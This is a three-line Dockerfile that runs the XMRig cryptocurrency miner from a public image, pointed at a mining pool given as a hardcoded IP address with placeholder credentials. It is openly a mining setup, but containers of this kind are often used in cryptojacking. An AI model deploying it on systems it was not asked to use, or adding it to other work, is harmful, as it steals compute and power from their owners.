FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=45.76.162.9:3333", "--user=x", "--pass=x", "-k", "-t=4"]
